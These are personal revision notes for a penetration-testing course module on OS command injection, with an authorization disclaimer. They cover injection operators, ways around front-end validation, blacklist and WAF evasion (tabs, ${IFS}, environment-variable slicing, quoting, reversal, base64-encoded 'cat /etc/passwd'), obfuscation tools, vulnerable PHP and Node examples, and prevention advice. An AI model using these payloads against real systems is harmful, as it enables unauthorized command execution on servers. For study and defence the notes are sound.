---
tags: [htb-academy, web-pentest, command-injection, revision]
module: Command Injections
---

# Command Injections: Revision Notes

> **Legend:** Unmarked = from your module text. **(Extra)** = my own added explanation or example. **⚠ Verify** = unclear or inconsistent in the source.
> **Authorization:** Only test command injection, filter bypasses, and obfuscation techniques against systems you are explicitly authorized to test. This module covers real RCE techniques.
> **Assessment note:** No flags or assessment answers are included. Section 7 gives approach only.

---

## 1. Main Concepts: What, Why, How

### 1.1 What Command Injection Is

- **What:** A vulnerability that lets an attacker execute arbitrary **system (OS) commands** on the back-end server, because user-controlled input is used — unsanitized — to build a command that the server executes.
- **Why it's critical:** Among the most severe vulnerability classes; can lead to full compromise of the host and potentially the wider network.
- **Where it sits in OWASP:** Injection vulnerabilities (as a family) rank **#3** in OWASP's Top 10 Web App Risks, due to high impact and prevalence.
- **General injection concept:** Occurs whenever user-controlled input is **misinterpreted as part of the query/code being executed** instead of as pure data — letting the attacker subvert the intended outcome.

### 1.2 Types of Injection (Overview)

| Injection type | Occurs when... |
|---|---|
| **OS Command Injection** | User input is directly used as part of an OS command |
| **Code Injection** | User input lands inside a function that evaluates code |
| **SQL Injection** | User input is directly used as part of an SQL query |
| **XSS / HTML Injection** | Exact user input is displayed on a page |

- Many other types exist: LDAP, NoSQL, HTTP Header, XPath, IMAP, ORM injection, etc. — as more web technologies emerge, new injection classes follow the same root cause: unsanitized input crossing from "data" into "code/query."

### 1.3 How OS Command Injection Happens in Code

- **Root cause:** A web app calls a system-command-execution function, feeding it (directly or indirectly) attacker-controlled input without sanitization.
- **PHP functions commonly involved:** `exec`, `system`, `shell_exec`, `passthru`, `popen` — each with slightly different behavior/use cases.

**PHP example (vulnerable):**
```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

**NodeJS example (vulnerable):**
```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```
- **Key point:** This is **not language-specific** — every backend language has equivalent system-command functions (`child_process.exec`/`spawn` in NodeJS, similar constructs in .NET, Java, etc.), and the vulnerability pattern and exploitation techniques are the same regardless of language/framework/OS. Also not limited to web apps — any binary or thick client that passes unsanitized input to a command-execution function is equally exploitable with the same methods.

---

## 2. Detection

- **Approach (for basic/direct command injection, this module's scope):** Append a command via an injection operator; if the output changes from the expected single-command result, injection succeeded. (More advanced — indirect/blind injection — needs fuzzing or code review; covered in the **Whitebox Pentesting 101: Command Injection** module, not here.)
- **Example scenario (source's "Host Checker" lab):** A tool takes an IP and pings it. Output format (`1 packets transmitted`) strongly suggests the underlying command is:
```bash
ping -c 1 OUR_INPUT
```
  — if that input isn't sanitized/escaped, additional commands may be injectable.

### 2.1 Injection Operators

| Operator | Character | URL-encoded | Executes |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both commands always |
| New line | `\n` | `%0a` | Both commands always |
| Background | `&` | `%26` | Both (second output usually shown first) |
| Pipe | `\|` | `%7c` | Both, but only second command's **output** shown |
| AND | `&&` | `%26%26` | Second **only if** first succeeds |
| OR | `\|\|` | `%7c%7c` | Second **only if** first fails |
| Sub-shell | `` `` `` | `%60%60` | Both (Linux only) |
| Sub-shell | `$()` | `%24%28%29` | Both (Linux only) |

- **Portability:** These operators generally work regardless of web app language/framework/backend OS — PHP-on-Linux, .NET-on-Windows, NodeJS-on-macOS all behave the same way.
- **⚠ Exception:** The semicolon (`;`) does **not** work if the command executes via Windows **CMD**, but **does** work if it executes via Windows **PowerShell**.

---

## 3. Injecting Commands

### 3.1 Semicolon Injection

**Test locally first (always validate your exact payload works before sending it over HTTP):**
```bash
ping -c 1 127.0.0.1; whoami
```
- Runs both commands unconditionally, returning both outputs.

**Payload for the vulnerable field:** `127.0.0.1; whoami`

### 3.2 Front-End-Only Validation Is Not a Real Defense

- **Symptom:** The web UI rejects non-IP input (e.g. "Match the requested format") with **no network request actually sent** — confirmed via DevTools' Network tab (`CTRL+SHIFT+E` in Firefox).
- **Conclusion:** Validation is happening purely client-side (JavaScript), which is common when front-end and back-end are built by different teams, or when the back-end simply trusts the front-end to have already filtered input.
- **Bypass approach:** Intercept the request with a proxy (**Burp Suite** or **ZAP**), configure the browser to route through it, enable intercept, submit a normal request, send it to **Repeater** (`CTRL+R` in Burp), then edit the raw HTTP request directly — bypassing any client-side JS entirely.
- **URL-encoding the payload:** Select the payload text in Burp and press `CTRL+U` to URL-encode it before sending, ensuring special characters survive transmission as intended.
- **Result:** Submitting the edited raw request with `127.0.0.1; whoami` as the IP value returns both the ping output and the `whoami` output in the response — confirmed command injection.

### 3.3 AND Operator (`&&`)

```bash
ping -c 1 127.0.0.1 && whoami
```
- Both commands run **only if the first succeeds**. URL-encoded in the request as `127.0.0.1+%26%26+whoami`.

### 3.4 OR Operator (`||`)

```bash
ping -c 1 127.0.0.1 || whoami
```
- **Only the first command's output appears** when it succeeds (exit code 0) — bash stops there and never tries the second command.
- **To force the second command to run:** make the first command **fail** (non-zero exit code) deliberately, e.g. by omitting the IP entirely:
```bash
ping -c 1 || whoami
```
  — `ping` errors out (`Destination address required`), so `whoami` then executes.
- **Payload:** `|| whoami` (no IP needed at all) — simpler payload, cleaner single-command output.

### 3.5 Operator Reference by Injection Type (broader context)

| Injection type | Common operators/characters |
|---|---|
| SQL Injection | `'` `,` `;` `--` `/* */` |
| Command Injection | `;` `&&` |
| LDAP Injection | `*` `(` `)` `&` `\|` |
| XPath Injection | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection | `;` `&` `\|` |
| Code Injection | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^` |
| Directory/Path Traversal | `../` `..\\` `%00` |
| Object Injection | `;` `&` `\|` |
| XQuery Injection | `'` `;` `--` `/* */` |
| Shellcode Injection | `\x` `\u` `%u` `%n` |
| Header Injection | `\n` `\r\n` `\t` `%0d` `%0a` `%09` |

- **⚠ Note:** This list is explicitly **not exhaustive** per the source — effective operators depend heavily on the specific target/environment.

---

## 4. Identifying and Bypassing Filters

### 4.1 Filter/WAF Detection

- **Symptom:** Previously working operators (`;`, `&&`, `||`) now trigger an **"invalid input"** response.
- **Where the block happens matters:**
  - Error shown **in the same field/page where output normally appears** → likely blocked by the **PHP application itself** (a blacklist).
  - Error shown as a **different page** (with info like your IP/request details) → may indicate a **WAF** sitting in front of the app.
- **Narrowing down the cause:** The sent payload (`127.0.0.1; whoami`) contains three new elements beyond the known-good IP: a semicolon, a space, and the word `whoami`. Any (or all) could be blacklisted — test incrementally.

### 4.2 Blacklisted Characters

**Example PHP blacklist filter:**
```php
$blacklist = ['&', '|', ';', ...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

**Identification method — reduce to one character at a time:**
- `127.0.0.1` → works.
- `127.0.0.1;` → still blocked → confirms `;` is blacklisted.
- Repeat for each operator/character to map out exactly what's filtered.

### 4.3 Bypassing Blacklisted Operators

- **Often-overlooked exception:** the **new-line character (`\n` / `%0a`)** is frequently left un-blacklisted, since it may legitimately appear elsewhere in input. It works as an injection operator on both Linux and Windows.
- **Payload:** `127.0.0.1%0a` → not blocked, confirms new-line works as the injection operator here.

### 4.4 Bypassing Blacklisted Spaces

- Space is a very commonly blacklisted character (especially when the field is "supposed" to be something simple like an IP, which never legitimately needs one).
- **Confirmed via same incremental-testing approach:** `127.0.0.1%0a whoami` still blocked → space is the next blocker once operator and command are both otherwise valid.

**Bypass techniques for spaces:**

| Technique | How |
|---|---|
| **Tabs** | Use `%09` (tab) instead of a literal space — both Linux and Windows treat tabs between arguments the same as spaces |
| **`${IFS}`** | Linux **I**nternal **F**ield **S**eparator environment variable; default value is a space+tab, so substituting `${IFS}` where a space would go gets auto-expanded |
| **Bash Brace Expansion** | `{ls,-la}` auto-inserts a space between comma-separated arguments without an actual space character in the payload |

**Examples:**
```
127.0.0.1%0a%09whoami          # tab bypass
127.0.0.1%0a${IFS}whoami       # $IFS bypass
127.0.0.1%0a{ls,-la}           # brace expansion bypass
```
- **Further reading pointer (source):** PayloadsAllTheThings' page on writing commands without spaces, for more bypass variants.

### 4.5 Bypassing Other Blacklisted Characters (Slashes, Semicolons, etc.)

**Linux — environment variable substring extraction:**
- Some characters (like `/`) have no dedicated "auto-expand" variable like `${IFS}`, but they **appear inside other environment variables** — extract them via substring slicing.
```bash
echo ${PATH}          # e.g. /usr/local/bin:/usr/bin:/bin:/usr/games
echo ${PATH:0:1}      # → / (start at index 0, length 1)
echo ${LS_COLORS:10:1}  # → ; (a semicolon, extracted similarly)
```
- `$HOME` or `$PWD` work the same way for producing a `/`.
- **Discovery method:** run `printenv` to see all environment variables and their contents, then slice out whichever character you need.
- **Combined payload example:** `127.0.0.1${LS_COLORS:10:1}${IFS}whoami` — gets both a semicolon (as operator) and a space, entirely from environment variables, with no literal `;` or space characters in the request.

**Windows CMD — substring extraction (similar concept, different syntax):**
```cmd
echo %HOMEPATH:~6,-11%
```
- E.g. `%HOMEPATH%` → `\Users\htb-student`; `~6` starts 6 chars in (`\htb-student`); `,-11` trims the last 11 chars (the username length), leaving just `\`.

**Windows PowerShell — array indexing:**
```powershell
$env:HOMEPATH[0]        # → \
$env:PROGRAMFILES[10]
```
- PowerShell treats a string/variable as a character array, so index directly into it.
- `Get-ChildItem Env:` lists all environment variables to search through for useful characters.

**Character shifting (Linux):**
- Shift any input character by +1 in the ASCII table using `tr`, to produce a target character without ever typing it.
```bash
man ascii          # \ is ASCII 92; the character just before it (91) is [
echo $(tr '!-}' '"-~'<<<[)   # outputs \
```
- **Method:** find the character immediately **before** your target in the ASCII table (`man ascii`), feed that into the `tr` range-shift command, and the output is your target character — never typed directly.
- **⚠ Windows equivalent exists via PowerShell** but tends to be notably longer/more verbose (per source, no concrete example given).

---

## 5. Bypassing Blacklisted Commands

### 5.1 Command Blacklist Filters

**Example PHP command blacklist:**
```php
$blacklist = ['whoami', 'cat', ...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```
- **Key weakness:** checks for an **exact substring match** — any obfuscation that avoids the literal blacklisted word slips through.

### 5.2 Basic Obfuscation — Character Insertion

**Quotes (Linux + Windows, works everywhere):**
```bash
w'h'o'am'i
w"h"o"am"i
```
- **Rules:** cannot **mix** quote types within one obfuscated word, and the count of quotes must be **even**.

**Linux-only insertable characters:**
```bash
who$@ami
w\ho\am\i
```
- Unlike quotes, these do **not** need to be used in even numbers — a single insertion is fine.

**Windows-only insertable character:**
```cmd
who^ami
```
- Caret (`^`) is ignored mid-command by CMD.

### 5.3 Advanced Command Obfuscation

**Case manipulation:**
- Windows (CMD/PowerShell are **case-insensitive**): simply change case, e.g. `WhOaMi` — works directly, no extra trick needed.
- Linux (bash is **case-sensitive**): need a command that *produces* an all-lowercase string from a mixed-case input at runtime.
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
or
```bash
$(a="WhOaMi";printf %s "${a,,}")
```
- **⚠ Gotcha from source:** these contain **spaces**, so if spaces are also filtered (common), you must combine this technique with a space-bypass (e.g. swap literal spaces for `%09` tabs) or the whole payload fails — and it's easy to mistakenly think the obfuscation technique itself "didn't work" when actually an unrelated filtered character broke it.

**Reversed commands:**
```bash
echo 'whoami' | rev     # → imaohw
$(rev<<<'imaohw')        # executes whoami, outputs normally
```
- The blacklisted word (`whoami`) never appears literally in the payload sent to the server.
- **Tip:** if you also need to bypass a character filter at the same time, remember to reverse those characters too (or include them when reversing the original command).

**Windows PowerShell equivalent:**
```powershell
"whoami"[-1..-20] -join ''      # → imaohw
iex "$('imaohw'[-1..-20] -join '')"   # executes it, outputs normally
```

**Encoded commands (base64/hex) — for commands containing filtered characters or risk of mangling in transit:**

Linux, base64 example:
```bash
echo -n 'cat /etc/passwd | grep 33' | base64
# → Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
- **Why `<<<` instead of `|`:** avoids using the pipe character, which may itself be filtered.
- **Why encode at all:** protects characters that might otherwise be blacklisted or mangled by URL-decoding along the way, and the command is **unique each time you craft it**, making it unlikely to match any known/public blacklist signature.
- **If `bash` or `base64` themselves are filtered:** apply the character-insertion techniques from §5.2 to them too, or substitute alternatives (`sh` for execution, `openssl` for base64 decoding, `xxd` for hex decoding).

Windows PowerShell base64 (UTF-16LE required):
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# → dwBoAG8AYQBtAGkA
```
Linux equivalent encoding (convert UTF-8 → UTF-16LE first):
```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# → dwBoAG8AYQBtAGkA
```
Decode and execute in PowerShell:
```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

- **(Extra)** Other technique families mentioned but not detailed in-module: wildcards, regex, output redirection, integer expansion — see PayloadsAllTheThings for more.

---

## 6. Evasion Tools (Automated Obfuscation)

### 6.1 Bashfuscator (Linux)

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```
```bash
cd ./bashfuscator/bin/
./bashfuscator -h
```
- **Basic use (random technique each run):**
```bash
./bashfuscator -c 'cat /etc/passwd'
```
  — picks obfuscation randomly; output length can range from a few hundred to **over a million characters**.
- **Controlled/shorter output:**
```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```
  - `-s`/`-t`: size/time tuning flags to constrain complexity.
  - `--no-mangling`: disables extra mangling for a cleaner/shorter result.
  - `--layers 1`: limits to a single obfuscation layer.
- **Verify before use:**
```bash
bash -c '<obfuscated payload>'
```

### 6.2 Invoke-DOSfuscation (Windows, interactive)

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```
```
Invoke-DOSfuscation> help
```
- Built-in `tutorial` option walks through example usage.
- **Main modes:** `BINARY` (obfuscated binary syntax for cmd.exe/powershell.exe), `ENCODING` (environment variable encoding), `PAYLOAD` (full obfuscated payload).

**Example session:**
```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```
- Produces an environment-variable-substring-based obfuscated command (same underlying concept as §4.5, automated).
- **⚠ No-Windows-VM workaround (source):** run via `pwsh` on Linux (pre-installed on Pwnbox) — same commands apply.
- **Further reading pointer (source):** Secure Coding 101: JavaScript module covers more advanced obfuscation methods applicable beyond just command injection.

---

## 7. Command Injection Prevention

### 7.1 Avoid System-Command Functions Entirely Where Possible

- **Best practice:** use a language's **built-in, purpose-specific function** instead of a generic shell-execution function. Example: to check host liveness in PHP, use `fsockopen()` instead of shelling out to `ping`.
- **If no built-in alternative exists:** never feed raw user input into the command function directly — always validate and sanitize first, and minimize how often such functions are used at all.
- **Indirect influence matters too:** even when user input isn't passed *directly*, if a user can indirectly influence what gets built into the command, the vulnerability can still exist.

### 7.2 Input Validation

- **What:** confirm input **matches an expected format**; reject anything that doesn't.
- **Must happen on both front-end and back-end** — front-end-only validation (as demonstrated in §3.2) is trivially bypassed.

**PHP — built-in filter for standard formats (e.g. IP):**
```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

**PHP — regex for non-standard formats:**
```php
preg_match($pattern, $input)
```

**JavaScript (front-end or NodeJS back-end) — regex IP validation:**
```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```
- NodeJS can also use library helpers like `is-ip`'s `isIp(ip)`.

### 7.3 Input Sanitization

- **What:** strip any non-necessary special characters from input — the **most critical** layer of injection prevention.
- **Order matters:** sanitization always happens **after** validation — even validated input should still be sanitized, since validation itself can fail (e.g. a flawed regex).
- **Why blacklisting specific words/characters (as seen throughout this module) is inadequate:** it's a reactive, incomplete approach — prefer built-in sanitization functions over custom blacklists.

**PHP — strip to only allowed characters:**
```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

**JavaScript equivalent:**
```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

**NodeJS — DOMPurify library:**
```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

**When all special characters must be allowed (e.g. free-text comments):**
- PHP: `filter_var` with the `escapeshellcmd` filter — escapes rather than strips special characters.
- NodeJS: `escape(ip)`.
- **⚠ Important caveat from the source:** escaping special characters (rather than stripping/validating strictly) is **"usually not considered a secure practice"**, since — as this entire module demonstrates — escaping-based defenses can often still be bypassed via the obfuscation techniques covered above.

### 7.4 Server Configuration Hardening

| Measure | Example |
|---|---|
| Web server/external WAF | Apache `mod_security`; Cloudflare, Fortinet, Imperva, etc. |
| Principle of Least Privilege (PoLP) | Run the web server as a low-privileged user (e.g. `www-data`) |
| Disable risky functions | PHP: `disable_functions=system,...` |
| Restrict filesystem scope | PHP: `open_basedir = '/var/www/html'` |
| Reject malformed requests | Reject double-encoded requests and non-ASCII characters in URLs |
| Avoid outdated/risky components | Avoid sensitive or outdated libraries/modules (e.g. PHP CGI) |

- **Bottom line (source's own framing):** Even with all of the above in place, thorough penetration testing is still necessary — a single flawed line of code in a large codebase can be enough to reintroduce the vulnerability. Secure coding practices and pentesting are complementary, not substitutes for each other.

---

## 8. Important Terminology

| Term | Short definition |
|---|---|
| Command Injection | Executing arbitrary OS commands via unsanitized input reaching a command-execution function |
| Injection operator | A shell metacharacter/sequence used to append or chain an additional command |
| Blacklist filter | A defense that denies requests containing specific forbidden characters or words |
| WAF | Web Application Firewall — broader, often network/edge-level protection against injection and other attacks |
| `${IFS}` | Linux Internal Field Separator variable, default value includes a space — usable to smuggle a space character |
| Brace expansion | Bash feature auto-inserting spaces between comma-separated items in `{a,b,c}` syntax |
| Character shifting | Producing a target character by ASCII-shifting an adjacent character via `tr` |
| Case manipulation (obfuscation) | Changing a command's letter casing to dodge a case-sensitive or exact-match blacklist |
| Reversed command | Writing a command backwards and reversing it back in a sub-shell at execution time |
| Sub-shell | A nested shell invocation (`` ` ` ``, `$()`) used to execute and substitute command output inline |
| Bashfuscator | Automated Linux bash command obfuscation tool |
| Invoke-DOSfuscation | Automated, interactive Windows cmd/PowerShell obfuscation tool |
| Input validation | Confirming input matches an expected format, rejecting what doesn't |
| Input sanitization | Stripping/escaping unnecessary special characters from input |
| PoLP | Principle of Least Privilege |
| `open_basedir` | PHP directive restricting the filesystem paths a script can access |
| `disable_functions` | PHP directive disabling specific (dangerous) functions server-wide |

---

## 9. Practical Workflow

1. **Confirm authorization and scope.**
2. **Identify a candidate input field** that plausibly feeds a system command (e.g. a "ping this host," file-processing, or similar utility feature).
3. **Confirm the underlying command structure** by observing output patterns (e.g. single-packet ping output implies `ping -c 1 <input>`).
4. **Test a baseline injection operator** (`;` first, since it's universally understood) appended to valid input, both locally (to confirm command syntax) and via the application.
5. **If the front-end blocks input format:** verify whether validation is client-side only (check DevTools Network tab for an absent request), then bypass via a proxy (Burp/ZAP) by editing and resending the raw HTTP request, URL-encoding the payload as needed.
6. **If still blocked (filter/WAF present):** incrementally reduce the payload to isolate exactly which character(s) or word(s) trigger the block.
7. **Bypass blacklisted operators:** try new-line (`%0a`) if standard operators are blocked.
8. **Bypass blacklisted spaces:** tabs (`%09`), `${IFS}`, or brace expansion.
9. **Bypass other blacklisted characters** (slashes, semicolons, etc.): environment-variable substring extraction (Linux) or substring/array-index extraction (Windows CMD/PowerShell), or ASCII character-shifting via `tr`.
10. **Bypass blacklisted commands:** start with simple character insertion (quotes, `\`, `$@`, `^`), escalate to case manipulation, command reversal, or custom base64/hex-encoded payloads if the target has more advanced filtering.
11. **For heavily defended targets:** use automated obfuscation tooling (Bashfuscator for Linux, Invoke-DOSfuscation for Windows) and tune output size/complexity as needed.
12. **Always test obfuscated payloads locally first** before sending them to the target, to confirm the obfuscation technique itself is correct before troubleshooting filter interactions.
13. **Document:** the vulnerable parameter, confirmed injection operator, any filters encountered, and the final working bypass payload.

### Common Mistakes
- Assuming front-end validation reflects back-end behavior — always verify independently.
- Forgetting to URL-encode payloads sent through a proxy/raw request.
- Concluding an obfuscation technique "doesn't work" when actually a different filtered character (often a space) is silently breaking the payload — always test incrementally.
- Mixing single and double quotes, or using an odd number of quotes, when using the quote-insertion bypass.
- Forgetting that `;` fails specifically under Windows CMD (but works under PowerShell).
- Using `|` in an encoding/decoding payload when `|` itself might be filtered — use `<<<` instead where possible.
- Treating escaping (rather than strict validation + sanitization) as sufficient defense — it's explicitly called out as not reliably secure in this module.
- Reaching for a blacklist-based defense at all instead of built-in validation/sanitization functions.

### Troubleshooting
- **Payload works locally but not via the app:** check for front-end-only validation (bypass via proxy), or a back-end filter (narrow down the exact blocked character/word incrementally).
- **Operator gets blocked:** try the new-line character, which is less commonly blacklisted.
- **Command gets blocked even with working operator/spacing:** apply command obfuscation (character insertion → case manipulation → reversal → encoding, roughly in order of complexity).
- **Obfuscated command still fails:** check whether the obfuscation payload itself introduces a newly-filtered character (e.g. spaces inside a `tr`-based case-folding command) — resolve with a space bypass from §4.4.
- **Manual techniques all fail against an advanced WAF:** escalate to Bashfuscator/Invoke-DOSfuscation for less-signature-recognizable payloads.

---

## 10. Quick Revision Sheet

### 10.1 Top 10 Things to Remember
1. Command injection happens when unsanitized user input reaches a system-command-execution function — language/framework/OS-agnostic vulnerability pattern.
2. Core injection operators: `;` `\n` `&` `|` `&&` `||` `` ` ` `` `$()` — semicolon fails under Windows CMD specifically (works under PowerShell).
3. Always test a payload locally first before sending it to the target.
4. Front-end-only validation is bypassed by intercepting and editing the raw HTTP request (Burp/ZAP).
5. Identify blacklisted characters/words by incrementally reducing the payload to isolate exactly what triggers a block.
6. Bypass space filters with tabs (`%09`), `${IFS}`, or Bash brace expansion.
7. Bypass other blacklisted single characters via environment-variable substring extraction (Linux: `${VAR:start:len}`; Windows CMD: `%VAR:~start,end%`; PowerShell: array indexing) or ASCII character-shifting (`tr`).
8. Bypass blacklisted commands (exact-match filters) via character insertion (quotes, `\`, `$@`, `^`), case manipulation, command reversal, or custom base64/hex-encoded payloads.
9. Automated obfuscation tools (Bashfuscator, Invoke-DOSfuscation) help against advanced WAFs when manual techniques are being fingerprinted.
10. Real prevention = avoid shell functions where possible, validate AND sanitize on the back-end (never front-end-only, never blacklist-only), and harden server configuration (PoLP, disabled functions, restricted filesystem scope, WAF).

### 10.2 Compact Payload/Technique Reference

| Goal | Technique |
|---|---|
| Basic injection | `127.0.0.1; whoami` |
| AND-chained injection | `127.0.0.1 && whoami` |
| OR-chained injection (force 2nd command) | `\|\| whoami` |
| Bypass blocked operators | Use `%0a` (new line) |
| Bypass blocked spaces | `%09` (tab) / `${IFS}` / `{cmd,arg}` |
| Bypass blocked `/` or `;` (Linux) | `${PATH:0:1}` / `${LS_COLORS:10:1}` style slicing |
| Bypass blocked `\` (Windows CMD) | `%HOMEPATH:~6,-11%` style slicing |
| Bypass blocked chars (PowerShell) | `$env:VAR[index]` |
| Produce a char via ASCII shift | `man ascii` then `tr '!-}' '"-~'<<<<char>` |
| Obfuscate command (quotes) | `w'h'o'am'i` / `w"h"o"am"i` |
| Obfuscate command (Linux-only insert) | `who$@ami` / `w\ho\am\i` |
| Obfuscate command (Windows-only insert) | `who^ami` |
| Obfuscate command (case, Windows) | `WhOaMi` (case-insensitive by default) |
| Obfuscate command (case, Linux) | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` |
| Obfuscate command (reversed) | `$(rev<<<'imaohw')` |
| Obfuscate command (base64, Linux) | `bash<<<$(base64 -d<<<ENCODED)` |
| Obfuscate command (base64, PowerShell) | `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ENCODED')))"` |
| Automated obfuscation (Linux) | `./bashfuscator -c 'CMD' -s 1 -t 1 --no-mangling --layers 1` |
| Automated obfuscation (Windows) | `Invoke-DOSfuscation` interactive session |

### 10.3 Common Mistakes to Avoid
- Trusting front-end validation as a real control.
- Not URL-encoding payloads sent via proxy tools.
- Misdiagnosing a working technique as "broken" when a different filtered character is the real cause.
- Odd/mismatched quote counts in quote-insertion obfuscation.
- Forgetting the Windows CMD-specific `;` limitation.
- Relying on escaping alone as a sanitization strategy.

### 10.4 Revision Questions

1. **Why is command injection considered language/framework-agnostic?**
   Every backend language offers equivalent system-command-execution functions (PHP's `system`/`exec`, NodeJS's `child_process.exec`, etc.), and the same injection operators and bypass techniques apply regardless of which one is used.
2. **Why does the semicolon operator fail specifically on Windows?**
   It fails only under Windows CMD specifically; it still works if the command is executed via PowerShell.
3. **How do you confirm that input validation is happening only on the front-end?**
   Check the browser's DevTools Network tab when submitting — if no new HTTP request is sent but an error still appears, validation is purely client-side.
4. **What's the standard method for identifying exactly which character is blacklisted?**
   Incrementally reduce the payload, testing one additional character/operator at a time, until you find the exact point where the request gets blocked.
5. **Name three ways to produce a space character without using a literal space.**
   Tabs (`%09`), the `${IFS}` environment variable, or Bash brace expansion (`{cmd,arg}`).
6. **How does environment-variable substring extraction work to produce a character like `/` on Linux?**
   Find a variable (e.g. `$PATH`) that contains the target character, then slice a substring of length 1 starting at the exact index where that character appears (e.g. `${PATH:0:1}`).
7. **Why does a command blacklist filter checking for an exact word match (like `whoami`) fail against obfuscation?**
   Because it looks for an exact substring match; inserting ignored characters (quotes, `\`, `$@`), changing case, reversing the string, or encoding the payload all produce the same executed command without that exact literal substring ever appearing.
8. **Why must quote-based command obfuscation use an even number of quotes and not mix types?**
   An odd count or mixed quote types would leave a quote unterminated, breaking the shell's parsing of the command.
9. **Why is escaping special characters (rather than strict validation + sanitization) considered insufficient as a sole defense?**
   Because, as this module demonstrates throughout, escaping-based defenses can frequently still be bypassed through various obfuscation and encoding techniques.
10. **Why is penetration testing still necessary even after implementing all recommended prevention measures?**
    Large codebases can contain a single flawed line that reintroduces the vulnerability despite otherwise solid practices — secure coding and testing are complementary, not substitutes.

### 10.5 Two-Minute Final Summary

Command injection lets an attacker execute arbitrary OS commands because user input reaches a system-command function unsanitized — a pattern identical across PHP, NodeJS, and every other backend language. Detection starts by appending a known injection operator (`;`, `&&`, `||`, new-line, pipe, sub-shell syntax) to otherwise-valid input and watching for a second command's output; always test the exact payload locally first. Front-end-only validation is bypassed trivially by intercepting and editing the raw HTTP request through a proxy like Burp.

When filters block operators, characters, or words, isolate the exact cause by reducing the payload one character at a time. New-line often slips past operator blacklists. Space filters fall to tabs, `${IFS}`, or Bash brace expansion. Other blacklisted single characters (slashes, semicolons) can be extracted from existing environment variables via substring slicing (Linux `${VAR:start:len}`, Windows CMD `%VAR:~start,end%`, PowerShell array indexing), or produced via ASCII character-shifting with `tr`. Blacklisted exact-match commands fall to character insertion (quotes, backslashes, `$@`, carets), case manipulation, string reversal executed via a sub-shell, or custom base64/hex-encoded payloads crafted uniquely each time to dodge signature matching. For advanced WAFs resisting manual bypasses, automated tools (Bashfuscator for Linux, Invoke-DOSfuscation for Windows) generate harder-to-fingerprint obfuscated payloads.

Real prevention means avoiding shell-execution functions in favor of built-in language alternatives wherever possible, validating input format on **both** front-end and back-end, sanitizing (stripping, not just escaping) special characters as the most critical defensive layer, and hardening server configuration — least-privilege service accounts, disabled dangerous functions, restricted filesystem scope, and a proper WAF. None of this replaces thorough penetration testing, since a single flawed line in a large codebase can still reopen the vulnerability.

---

## 11. Skills Assessment: Approach Only

The assessment involves a file manager web application — a plausible command injection target, since file managers commonly shell out to system commands for file operations. The task is to detect the vulnerability and then exploit it while evading whatever filters are in place. These notes contain no answers. Apply the workflow in §9: identify the candidate input, confirm the underlying command structure, test baseline operators, and work through the filter-bypass and obfuscation techniques in §4–§5 as needed based on what gets blocked.
